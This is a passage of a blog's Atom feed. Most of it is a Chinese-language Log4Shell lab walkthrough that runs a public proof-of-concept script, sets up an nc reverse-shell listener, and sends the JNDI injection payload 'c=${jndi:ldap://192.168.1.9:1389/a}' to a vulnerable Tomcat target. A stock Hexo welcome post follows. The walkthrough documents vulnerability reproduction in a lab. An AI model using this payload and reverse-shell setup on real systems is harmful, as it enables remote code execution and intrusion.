comment&#34;&gt;#进入容器&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;docker &lt;span class=&#34;token builtin class-name&#34;&gt;exec&lt;/span&gt; -it log4j_vuln_container /bin/bash&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#运行 apache 服务&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/bin/bash /home/apache-tomcat-8.5.45/bin/startup.sh&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;访问漏洞靶场地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMS4xNjo4MDgwL3dlYnN0dWR5Lw==&#34;&gt;http://192.168.1.16:8080/webstudy/&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zMi5sb2xpLm5ldC8yMDIxLzEyLzE5L3BrdnhjRWhJc05MT1diQy5qcGc=&#34;&gt;https://s2.loli.net/2021/12/19/pkvxcEhIsNLOWbC.jpg&lt;/span&gt;&lt;/p&gt;
+&lt;h3 id=&#34;攻击机器下载配置poc&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#攻击机器下载配置poc&#34;&gt;#&lt;/a&gt; 攻击机器下载配置 poc&lt;/h3&gt;
+&lt;p&gt;下载 poc 项目：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2tvem1lcg==&#34;&gt;kozmer&lt;/span&gt;/&lt;strong&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2tvem1lci9sb2c0ai1zaGVsbC1wb2M=&#34;&gt;log4j-shell-poc&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;!(&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zMi5sb2xpLm5ldC8yMDIxLzEyLzE5L3ZmZ0lVNDVXMU90ekRTTi5qcGc=&#34;&gt;https://s2.loli.net/2021/12/19/vfgIU45W1OtzDSN.jpg&lt;/span&gt;)&lt;/p&gt;
+&lt;p&gt;安装 poc.py 运行所需 python 包&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;pip3 &lt;span class=&#34;token function&#34;&gt;install&lt;/span&gt; colorama&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;pip3 &lt;span class=&#34;token function&#34;&gt;install&lt;/span&gt; argparse&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;poc.py 运行需调用 Java1.8，已安装 JDK 的情况下，修改 poc.py 中 Java_Home 路径为本地路径&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zMi5sb2xpLm5ldC8yMDIxLzEyLzE5L1dKblN4NGVOWWJwajJyOS5qcGc=&#34;&gt;https://s2.loli.net/2021/12/19/WJnSx4eNYbpj2r9.jpg&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zMi5sb2xpLm5ldC8yMDIxLzEyLzE5L2tYZmI1dFNqZXVDejJQbi5qcGc=&#34;&gt;https://s2.loli.net/2021/12/19/kXfb5tSjeuCz2Pn.jpg&lt;/span&gt;&lt;/p&gt;
+&lt;h2 id=&#34;漏洞复现&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞复现&#34;&gt;#&lt;/a&gt; 漏洞复现&lt;/h2&gt;
+&lt;p&gt;目标机器：已运行漏洞靶场环境&lt;/p&gt;
+&lt;p&gt;攻击机器：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1wb2MtYnM3aWo0MmEucHk=&#34;&gt;运行 poc.py&lt;/span&gt;，并设置监听，这里攻击 IP 为 192.168.1.9，http 服务端口为 8000，反弹 shell（监听）端口为 9001&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#运行 poc.py&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;python3 poc.py --userip &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.1.9 --webport &lt;span class=&#34;token number&#34;&gt;8000&lt;/span&gt; --lport &lt;span class=&#34;token number&#34;&gt;9001&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#新开 shell 窗口并设置监听&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;nc&lt;/span&gt; -lvn &lt;span class=&#34;token number&#34;&gt;9001&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zMi5sb2xpLm5ldC8yMDIxLzEyLzE5L0c3aXE5dmFRNUt1VDMyeC5qcGc=&#34;&gt;https://s2.loli.net/2021/12/19/G7iq9vaQ5KuT32x.jpg&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;访问 http://192.168.1.16:8080/webstudy/，点击 hit me 提示我们用 post 请求，使用 hackbar 来发送 post 请求，这里漏洞靶场的 post 请求参数为 c，我们发送 &lt;code&gt;c=$&amp;#123;jndi:ldap://192.168.1.9:1389/a&amp;#125;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zMi5sb2xpLm5ldC8yMDIxLzEyLzE5L2NVdnJFZm1PYUJ0bmxleS5qcGc=&#34;&gt;https://s2.loli.net/2021/12/19/cUvrEfmOaBtnley.jpg&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;查看监听，成功反弹 shell&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zMi5sb2xpLm5ldC8yMDIxLzEyLzE5L0R5Z0FPWlhCTlBuMm1oYS5qcGc=&#34;&gt;https://s2.loli.net/2021/12/19/DygAOZXBNPn2mha.jpg&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;希望大家复现成功！&lt;/p&gt;
+</content>
+        <category term="Log4j" scheme="https://moonoon20.github.io/tags/Log4j/" />
+        <updated>2021-12-19T14:36:41.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://moonoon20.github.io/2021/12/19/hello-world/</id>
+        <title>Hello World</title>
+        <link rel="alternate" href="https://moonoon20.github.io/2021/12/19/hello-world/"/>
+        <content type="html">&lt;p&gt;Welcome to &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvLw==&#34;&gt;Hexo&lt;/span&gt;! This is your very first post. Check &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mv&#34;&gt;documentation&lt;/span&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3MvdHJvdWJsZXNob290aW5nLmh0bWw=&#34;&gt;troubleshooting&lt;/span&gt; or you can ask me on &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvL2lzc3Vlcw==&#34;&gt;GitHub&lt;/span&gt;.&lt;/p&gt;
+&lt;h2 id=&#34;quick-start&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#quick-start&#34;&gt;#&lt;/a&gt; Quick Start&lt;/h2&gt;
+&lt;h3 id=&#34;create-a-new-post&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#create-a-new-post&#34;&gt;#&lt;/a&gt; Create a new post&lt;/h3&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;span&gt;h&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;$ hexo new &lt;span class=&#34;token string&#34;&gt;&#34;My New Post&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvd3JpdGluZy5odG1s&#34;&gt;Writing&lt;/span&gt;&lt;/p&gt;
+&lt;h3 id=&#34;run-server&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#run-server&#34;&gt;#&lt;/a&gt; Run server&lt;/h3&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;span&gt;h&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;$ hexo server&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvc2VydmVyLmh0bWw=&#34;&gt;Server&lt;/span&gt;&lt;/p&gt;
+&lt;h3 id=&#34;generate-static-files&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#generate-static-files&#34;&gt;#&lt;/a&gt; Generate static files&lt;/h3&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;span&gt;h&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;$ hexo generate&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3MvZ2VuZXJhdGluZy5odG1s&#34;&gt;Generating&lt;/span&gt;&lt;/p&gt;
+&lt;h3 id=&#34;deploy-to-remote-sites&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#deploy-to-remote-sites&#34;&gt;#&lt;/a&gt; Deploy to remote sites&lt;/h3&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;span&gt;h&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;$ hexo deploy&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvb25lLWNvbW1hbmQtZGVwbG95bWVudC5odG1s&#34;&gt;Deployment&lt;/span&gt;&lt;/p&gt;
+</content>
+        <updated>2021-12-19T13:25:10.943Z</updated>
+    </entry>
+</feed>
